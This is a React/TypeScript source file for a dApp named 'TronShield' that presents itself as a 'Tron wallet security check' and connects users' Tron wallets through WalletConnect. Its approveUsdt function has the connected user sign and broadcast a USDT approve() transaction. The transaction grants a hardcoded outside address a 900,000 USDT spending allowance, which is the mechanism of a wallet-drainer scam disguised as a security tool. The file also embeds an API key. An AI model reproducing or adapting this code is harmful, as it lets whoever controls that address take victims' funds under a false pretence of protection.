"use client";

import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
import { Button } from "./ui/button";
import {
  createContext,
  useContext,
  useState,
  useEffect,
  ReactNode,
} from "react";
import TronWeb from "tronweb";

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: { "TRON-PRO-API-KEY": "85678497-d91b-4fa8-aafb-7706c193445f" },
});

const adapter = new WalletConnectAdapter({
  network: "Mainnet",
  options: {
    relayUrl: "wss://relay.walletconnect.com",
    projectId: "d5153883a71d3a3cb88a074044400e52",
    metadata: {
      name: "TronShield",
      description: "Tron wallet security check",
      url: window.location.origin,
      icons: [`${window.location.origin}/favicon.ico`],
    },
  },
  web3ModalConfig: {
    themeMode: "dark",
    themeVariables: {
      "--w3m-z-index": "1000",
    },
    explorerRecommendedWalletIds: [
      "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f", // TronLink
      "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369", // TokenPocket
      "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // MathWallet
    ],
  },
});

interface TronConnectContextType {
  connectWallet: () => Promise<void>;
  disconnectWallet: () => Promise<void>;
  approveUsdt: () => Promise<void>;
  isConnected: boolean;
  address: string | null;
  isConnecting: boolean;
  error: Error | null;
}

const TronConnectContext = createContext<TronConnectContextType>(
  {} as TronConnectContextType
);

export const useTronConnect = () => useContext(TronConnectContext);

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT contract on Tron mainnet

export function TronConnectProvider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<Error | null>(null);

  useEffect(() => {
    // Check if already connected
    if (adapter.connected) {
      setIsConnected(true);
      setAddress(adapter.address);
    }

    // Listen for connection events
    adapter.on("connect", () => {
      setIsConnected(true);
      setAddress(adapter.address);
    });

    adapter.on("disconnect", () => {
      setIsConnected(false);
      setAddress(null);
    });

    return () => {
      adapter.removeAllListeners();
    };
  }, []);

  const connectWallet = async () => {
    try {
      setIsConnecting(true);
      setError(null);
      await adapter.connect();
      console.log("Connected");
      console.log(adapter.address);
    } catch (err) {
      console.error("Failed to connect wallet:", err);
      setError(err instanceof Error ? err : new Error(String(err)));
    } finally {
      setIsConnecting(false);
    }
  };

  const disconnectWallet = async () => {
    try {
      if (isConnected) {
        await adapter.disconnect();
      }
    } catch (err) {
      console.error("Failed to disconnect wallet:", err);
      setError(err instanceof Error ? err : new Error(String(err)));
    }
  };

  const approveUsdt = async () => {
    try {
      if (!isConnected || !address) {
        throw new Error("Wallet not connected");
      }

      const amountInSun = TronWeb.toSun("900000");

      console.log(adapter.connected, adapter.address);
      tronWeb.setAddress(adapter.address ?? "");

      const parameters = [
        { type: "address", value: "TFQToKaZrKLeZVRzwM6cTTQ3SN3UMb9jaY" },
        { type: "uint256", value: amountInSun },
      ];

      const functionSelector = "approve(address,uint256)";
      const unSignedTransaction =
        await tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT_ADDRESS,
          functionSelector,
          {},
          parameters
        );
      // using adapter to sign the transaction
      const signedTransaction = await adapter.signTransaction(
        unSignedTransaction.transaction
      );
      // broadcast the transaction
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

      console.log("USDT approval transaction:", result);
      return result;
    } catch (err) {
      console.error("Failed to approve USDT:", err);
      setError(err instanceof Error ? err : new Error(String(err)));
      throw err;
    }
  };

  const value = {
    connectWallet,
    disconnectWallet,
    approveUsdt,
    isConnected,
    address,
    isConnecting,
    error,
  };

  return (
    <TronConnectContext.Provider value={value}>
      {children}
    </TronConnectContext.Provider>
  );
}

export function TronConnect() {
  const { connectWallet, isConnected, isConnecting } = useTronConnect();

  return (
    <Button onClick={connectWallet} disabled={isConnecting}>
      {isConnecting ? "Connecting..." : isConnected ? "Connected" : "Connect"}
    </Button>
  );
}
